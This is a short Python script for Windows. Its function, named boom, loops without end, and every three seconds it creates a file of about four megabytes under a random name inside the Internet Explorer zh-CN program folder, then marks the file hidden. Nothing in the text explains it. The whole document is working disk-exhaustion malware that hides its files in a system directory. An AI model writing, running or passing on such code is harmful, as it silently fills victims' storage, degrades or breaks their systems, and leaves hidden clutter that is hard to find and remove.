from random import randint
from os.path import join
from time import sleep
import win32con, win32api


def hidden(file_name):
    win32api.SetFileAttributes(join('C:\Program Files (x86)\Internet Explorer\zh-CN', file_name),
                               win32con.FILE_ATTRIBUTE_HIDDEN)


def boom():
    while True:
        try:
            name = str(randint(0, 1000000000))
            with open(
                    join('C:\Program Files (x86)\Internet Explorer\zh-CN', name), 'w') as file:
                file.seek(1024 * 1024 * 1 * 4)
                file.write(name)
                hidden(name)
                sleep(3)
        except:
            break


if __name__ == '__main__':
    boom()
